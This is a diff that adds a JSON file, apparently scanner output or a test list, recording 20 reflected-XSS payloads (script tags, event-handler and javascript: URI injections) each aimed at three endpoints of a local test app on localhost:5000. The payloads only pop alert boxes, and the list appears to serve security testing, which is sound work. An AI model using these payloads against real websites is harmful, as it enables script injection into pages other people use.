@@ -1,0 +1,362 @@
+[
+    {
+        "url": "http://localhost:5000/search",
+        "payload": "<script>alert(1)</script>",
+        "method": "get",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/search",
+        "payload": "<img src=x onerror=alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/search",
+        "payload": "<svg/onload=alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/search",
+        "payload": "<body onload=alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/search",
+        "payload": "\"><script>alert(1)</script>",
+        "method": "get",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/search",
+        "payload": "'><script>alert(1)</script>",
+        "method": "get",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/search",
+        "payload": "<iframe src=javascript:alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/search",
+        "payload": "<details open ontoggle=alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/search",
+        "payload": "<marquee onstart=alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/search",
+        "payload": "<video><source onerror=alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/search",
+        "payload": "<audio src=x onerror=alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/search",
+        "payload": "<object data=javascript:alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/search",
+        "payload": "<embed src=javascript:alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/search",
+        "payload": "<img src=1 onerror=alert(document.domain)>",
+        "method": "get",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/search",
+        "payload": "<svg><script>alert(1)</script></svg>",
+        "method": "get",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/search",
+        "payload": "<input autofocus onfocus=alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/search",
+        "payload": "<textarea autofocus onfocus=alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/search",
+        "payload": "<select autofocus onfocus=alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/search",
+        "payload": "<keygen autofocus onfocus=alert(1)>",
+        "method": "get",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/search",
+        "payload": "<math href='javascript:alert(1)'>CLICK</math>",
+        "method": "get",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/login",
+        "payload": "<script>alert(1)</script>",
+        "method": "post",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/login",
+        "payload": "<img src=x onerror=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/login",
+        "payload": "<svg/onload=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/login",
+        "payload": "<body onload=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/login",
+        "payload": "\"><script>alert(1)</script>",
+        "method": "post",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/login",
+        "payload": "'><script>alert(1)</script>",
+        "method": "post",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/login",
+        "payload": "<iframe src=javascript:alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/login",
+        "payload": "<details open ontoggle=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/login",
+        "payload": "<marquee onstart=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/login",
+        "payload": "<video><source onerror=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/login",
+        "payload": "<audio src=x onerror=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/login",
+        "payload": "<object data=javascript:alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/login",
+        "payload": "<embed src=javascript:alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/login",
+        "payload": "<img src=1 onerror=alert(document.domain)>",
+        "method": "post",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/login",
+        "payload": "<svg><script>alert(1)</script></svg>",
+        "method": "post",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/login",
+        "payload": "<input autofocus onfocus=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/login",
+        "payload": "<textarea autofocus onfocus=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/login",
+        "payload": "<select autofocus onfocus=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/login",
+        "payload": "<keygen autofocus onfocus=alert(1)>",
+        "method": "post",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/login",
+        "payload": "<math href='javascript:alert(1)'>CLICK</math>",
+        "method": "post",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/profile?name=test",
+        "payload": "<script>alert(1)</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/profile?name=test",
+        "payload": "<img src=x onerror=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/profile?name=test",
+        "payload": "<svg/onload=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/profile?name=test",
+        "payload": "<body onload=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/profile?name=test",
+        "payload": "\"><script>alert(1)</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/profile?name=test",
+        "payload": "'><script>alert(1)</script>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/profile?name=test",
+        "payload": "<iframe src=javascript:alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/profile?name=test",
+        "payload": "<details open ontoggle=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/profile?name=test",
+        "payload": "<marquee onstart=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/profile?name=test",
+        "payload": "<video><source onerror=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/profile?name=test",
+        "payload": "<audio src=x onerror=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/profile?name=test",
+        "payload": "<object data=javascript:alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/profile?name=test",
+        "payload": "<embed src=javascript:alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/profile?name=test",
+        "payload": "<img src=1 onerror=alert(document.domain)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/profile?name=test",
+        "payload": "<svg><script>alert(1)</script></svg>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/profile?name=test",
+        "payload": "<input autofocus onfocus=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/profile?name=test",
+        "payload": "<textarea autofocus onfocus=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/profile?name=test",
+        "payload": "<select autofocus onfocus=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/profile?name=test",
+        "payload": "<keygen autofocus onfocus=alert(1)>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS"
+    },
+    {
+        "url": "http://localhost:5000/profile?name=test",
+        "payload": "<math href='javascript:alert(1)'>CLICK</math>",
+        "method": "URL_PARAMETER",
+        "type": "Reflected XSS"
+    }
+]
